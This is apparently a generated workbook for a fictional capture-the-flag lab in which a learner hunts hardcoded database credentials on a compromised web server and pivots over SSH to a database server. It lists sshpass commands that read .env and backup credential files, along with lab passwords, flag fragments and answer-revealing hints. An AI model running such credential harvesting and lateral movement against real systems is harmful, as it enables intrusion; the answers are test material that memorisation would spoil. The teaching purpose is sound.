# Crestline Financial - Credential Pivot Attack

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-4-1-credential-pivot-attack/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Crestline Financial - Credential Pivot Attack** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **50 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Crestline Financial Services, a regional investment firm based in Charlotte,
North Carolina, engaged your team at Apex Red Team for an internal network
penetration test. Phase 1 is complete - your team gained initial access to the
company's front-end web server through a vulnerability in their customer portal.

You now have SSH access to the web server as the "webdev" service account. Your
objective for Phase 2 is lateral movement: find a way to reach other systems on
the internal network. Crestline's IT manager, Nathan Cole, mentioned during the
scoping call that the web application connects to an internal database server
that "only the app can reach." He's confident the database credentials are
properly secured.

Prove him wrong. Find the database credentials, pivot to the internal server,
and extract the assessment marker to demonstrate the risk. Document the full
attack chain for the final report.

**Credentials**

- Web Server SSH: `webdev` / `Cr3st_W3b_2024#`

## Your Objectives

- Enumerate a compromised web server for stored credentials and configuration files
- Identify hardcoded database credentials in application configuration
- Use discovered credentials to pivot laterally to an internal server
- Extract evidence from the database server to complete the assessment
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**SSH to web server as webdev**

```bash
sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@<target> 'whoami' 2>&1
```

Expected: `webdev`

**Discover application config with database credentials**

```bash
sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@<target> 'cat /var/www/crestline-portal/.env 2>/dev/null | grep DB_PASS' 2>&1
```

Expected: `F1n4nc3_DB_Pr0d#`

**Find flag part 1 on web server**

```bash
sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@<target> 'cat /var/www/crestline-portal/config/api_keys.bak 2>/dev/null | grep -o "assessment_token=[a-z0-9_]*" | sed "s/^assessment_token=//"' 2>&1
```

Expected: `cr3d`

**Pivot to database server using discovered credentials**

```bash
sshpass -p '{cred.dbadmin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.dbadmin.user}@<target> 'whoami' 2>&1
```

Expected: `dbadmin`

**Find flag part 2 on database server**

```bash
sshpass -p '{cred.dbadmin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.dbadmin.user}@<target> 'cat /home/dbadmin/maintenance/assessment_token.txt 2>/dev/null' 2>&1
```

Expected: `p1v0t`

**Assemble and verify complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{...}`


### Hint ladder

<details><summary>Hint 1 (unlocks after 8 minutes)</summary>

You're on the web server as the webdev user. Start by exploring the
filesystem - web applications often store configuration files with database
credentials. Check common locations: /var/www/, application directories,
and any files ending in .env, .conf, .cfg, or .ini.

</details>

<details><summary>Hint 2 (unlocks after 16 minutes)</summary>

Look in /var/www/crestline-portal/. The application has a .env file and a
config/ directory. One of these contains the database credentials including
the hostname, username, and password. Use those to SSH to the database server.

</details>

<details><summary>Hint 3 (unlocks after 24 minutes)</summary>

The file /var/www/crestline-portal/.env contains DB_PASS=F1n4nc3_DB_Pr0d#
and DB_HOST=dbserver. Use these credentials to SSH to the database server
as dbadmin. Once there, check the dbadmin home directory for the assessment
marker. The first flag part is on the webserver in the config directory.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
